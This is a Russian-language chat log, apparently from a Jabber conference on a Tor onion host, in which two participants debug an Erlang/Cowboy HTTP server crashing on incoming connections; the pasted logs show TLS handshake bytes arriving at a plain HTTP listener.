Timestamp	From	To	Message
2021-08-27 10:23:28.267837	ttrr	buza	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:24:52.840285	ttrr	buza	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:25:59.986038	ttrr	buza	тута
2021-08-27 10:25:59.986515	ttrr	buza	ждем остальных
2021-08-27 10:25:59.987382	ttrr	buza	ок
2021-08-27 10:26:04.830105	buza	ttrr	хай
2021-08-27 10:26:04.831426	ttrr	buza	хай
2021-08-27 10:26:17.234573	buza	ttrr	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:26:17.235232	ttrr	buza	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:27:43.437940	ttrr	buza	это только для зарегистрированных участников
2021-08-27 10:27:48.741742	ttrr	buza	других тут не может быть
2021-08-27 10:28:03.704726	ttrr	buza	хоф остался
2021-08-27 10:30:23.085238	ttrr	buza	на месте
2021-08-27 10:30:28.882477	ttrr	buza	привет
2021-08-27 10:34:32.662119	ttrr	buza	короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки
2021-08-27 10:35:13.159029	ttrr	buza	от этого возникает краш на моей стороне и я не могу обработать запрос
2021-08-27 10:35:33.426058	buza	ttrr	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:33.428199	ttrr	buza	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:41.723544	buza	ttrr	1. Content-Length
2021-08-27 10:35:41.727078	ttrr	buza	1. Content-Length
2021-08-27 10:35:47.128748	buza	ttrr	2. Connection: close
2021-08-27 10:35:47.131450	ttrr	buza	2. Connection: close
2021-08-27 10:36:04.112043	buza	ttrr	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:04.114815	ttrr	buza	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:15.501318	buza	ttrr	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:15.503688	ttrr	buza	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:21.261721	buza	ttrr	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:21.264539	ttrr	buza	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:59.316439	buza	ttrr	defender добавь сюда flip и steller
2021-08-27 10:36:59.318926	ttrr	buza	defender добавь сюда flip и steller
2021-08-27 10:37:09.754602	ttrr	buza	да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . 
причем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных
2021-08-27 10:37:22.166772	buza	ttrr	так вот разберись
2021-08-27 10:37:22.168826	ttrr	buza	так вот разберись
2021-08-27 10:37:36.831821	buza	ttrr	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:36.834026	ttrr	buza	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:55.059418	ttrr	buza	причина есть .если эта причина удовлетворяет спеицификациям хттп ..
2021-08-27 10:37:55.375276	buza	ttrr	например им сложно использовать chunked-передачу
2021-08-27 10:37:55.376651	ttrr	buza	например им сложно использовать chunked-передачу
2021-08-27 10:38:34.863809	buza	ttrr	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:34.865831	ttrr	buza	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:38.660945	ttrr	buza	если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп
2021-08-27 10:39:02.445462	buza	ttrr	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:02.448656	ttrr	buza	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:06.118329	ttrr	buza	либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается
2021-08-27 10:39:17.550442	ttrr	buza	она умеет всё
2021-08-27 10:39:26.512879	buza	ttrr	как видим не всё
2021-08-27 10:39:26.514058	ttrr	buza	как видим не всё
2021-08-27 10:39:29.429924	ttrr	buza	это промышленное решение .. и её пользуются очень многие
2021-08-27 10:39:40.113760	buza	ttrr	давай на примерах
2021-08-27 10:39:40.115845	ttrr	buza	давай на примерах
2021-08-27 10:39:46.364690	ttrr	buza	примерах что ?
2021-08-27 10:39:51.187334	buza	ttrr	кривой посылки
2021-08-27 10:39:51.191023	ttrr	buza	кривой посылки
2021-08-27 10:40:03.663968	buza	ttrr	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:03.665620	ttrr	buza	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:15.077900	ttrr	buza	еще раз . у меня нет доступа к бинарному потоку ..
2021-08-27 10:40:19.331153	ttrr	buza	либа от меня это скрывает
2021-08-27 10:40:31.497173	buza	ttrr	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:31.498684	ttrr	buza	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:39.255519	ttrr	buza	я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет
2021-08-27 10:40:52.885162	buza	ttrr	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:52.889084	ttrr	buza	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:58.709751	ttrr	buza	нет
2021-08-27 10:41:03.477069	ttrr	buza	только через прокси какой могу
2021-08-27 10:41:07.271519	buza	ttrr	поставь mitmproxy
2021-08-27 10:41:07.275909	ttrr	buza	поставь mitmproxy
2021-08-27 10:41:18.237446	buza	ttrr	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.240705	ttrr	buza	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.451074	ttrr	buza	ну или логи сделать внутри либы
2021-08-27 10:41:22.816407	ttrr	buza	это уже по живому надо
2021-08-27 10:41:51.571245	buza	ttrr	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:41:51.573122	ttrr	buza	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:42:05.075063	ttrr	buza	в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере ..
2021-08-27 10:42:05.581165	buza	ttrr	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:05.582298	ttrr	buza	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:08.864149	ttrr	buza	может убрать либу? получать данные с сокета?
2021-08-27 10:42:10.027592	ttrr	buza	они тоже могут дать пример потока
2021-08-27 10:42:18.328249	ttrr	buza	парсить хттп сам будешь ?
2021-08-27 10:42:39.087328	buza	ttrr	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:39.089012	ttrr	buza	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:43.638886	ttrr	buza	мне щас надо на часок отлучится .. приду - сделаю - посмотрю
2021-08-27 10:42:44.192351	buza	ttrr	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.193075	ttrr	buza	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.437845	ttrr	buza	ну а какой выход?
2021-08-27 10:42:52.129081	buza	ttrr	уже не раз так было
2021-08-27 10:42:52.130771	ttrr	buza	уже не раз так было
2021-08-27 10:42:54.116230	ttrr	buza	выход - разбираться
2021-08-27 10:42:55.649371	buza	ttrr	по пути у нас прокладки
2021-08-27 10:42:55.654050	ttrr	buza	по пути у нас прокладки
2021-08-27 10:42:59.527892	buza	ttrr	и наши, и чужие
2021-08-27 10:42:59.529083	ttrr	buza	и наши, и чужие
2021-08-27 10:43:06.781641	buza	ttrr	они жонглируют заголовками
2021-08-27 10:43:06.786796	ttrr	buza	они жонглируют заголовками
2021-08-27 10:43:16.159578	buza	ttrr	они имеют право перекодировать пакеты
2021-08-27 10:43:16.180760	ttrr	buza	они имеют право перекодировать пакеты
2021-08-27 10:43:18.436074	ttrr	buza	отошел
2021-08-27 12:29:10.137490	ttrr	buza	я на живом сейчас экспериментирую
2021-08-27 12:49:43.333972	ttrr	buza	2021-08-27 15:43:18.250 [info] <0.173.0> Data: <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,227,118,111,91,127,244,240,143,161,47,114,14,107,0,0,14,192,10,192,9,192,20,192,19,0,53,0,47,0,10,1,0,0,63,0,0,0,28,0,26,0,0,23,116,114,97,99,107,46,97,110,97,108,121,116,105,99,115,45,100,97,116,97,46,105,111,0,10,0,8,0,6,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,23,0,0,255,1,0,1,0>> 
2021-08-27 15:43:18.251 [error] emulator Error in process <0.173.0> on node dero_server@server with exit value:
2021-08-27 15:43:18.251 [error] <0.173.0>@cowboy_protocol:parse_method:169 Ranch listener http terminated with reason: no function clause matching cowboy_protocol:parse_method(<<>>, {state,#Port<0.4001>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[...]}],...}, <<22,3,1,0,122,1,0,0,118,3,1,97,40,221,230,188,215,55,88,76,161,53,70,161,100,228,44,187,170,189,...>>) line 169

вот из лога бинарный поток
2021-08-27 12:49:51.524311	ttrr	buza	который вызывает проблему
2021-08-27 12:50:38.329503	ttrr	buza	а вот это:

2021-08-27 15:43:18.007 [info] <0.158.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,85,217,147,101,152,84,237,168,57,127,64,130,166,246,5,28,145,200,82,174,223,48,129,23,230,170,167,24,30,118,147,105,32,112,120,62,28,164,221,67,133,188,32,79,97,132,30,48,15,140,239,224,165,168,5,1,6,12,28,143,159,175,32,133,143,0,54,218,218,19,1,19,2,19,3,192,44,192,43,204,169,192,48,192,47,204,168,192,36,192,35,192,10,192,9,192,40,192,39,192,20,192,19,0,157,0,156,0,61,0,60,0,53,0,47,192,8,192,18,0,10,1,0,1,125,234,234,0,0,0,0,0,23,0,21,0,0,18,103,97,116,101,119,97,121,46,105,99,108,111,117,100,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,12,0,10,202,202,0,29,0,23,0,24,0,25,0,11,0,2,1,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,24,0,22,4,3,8,4,4,1,5,3,2,3,8,5,8,5,5,1,8,6,6,1,2,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,233,161,223,78,0,73,53,96,119,159,215,212,71,216,72,236,103,226,140,165,145,139,122,217,41,240,23,248,115,130,152,66,0,45,0,2,1,1,0,43,0,11,10,154,154,3,4,3,3,3,2,3,1,250,250,0,1,0,0,21,0,183,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,...>>
 State: {state,#Port<0.3896>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630068203006}
 ReqEmpty 0

проблемы не вызывает
2021-08-27 12:51:26.604074	ttrr	buza	или вот это:


